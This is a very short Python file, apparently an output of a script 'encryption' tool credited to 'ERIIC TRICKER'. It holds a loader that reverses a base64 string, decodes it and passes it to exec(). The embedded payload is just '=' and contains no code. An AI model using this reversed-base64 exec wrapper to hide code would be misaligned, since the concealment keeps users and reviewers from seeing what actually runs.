# Encrypted By ERIIC TRICKER
 # Github : https://github.com/ERIIC-3XO
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))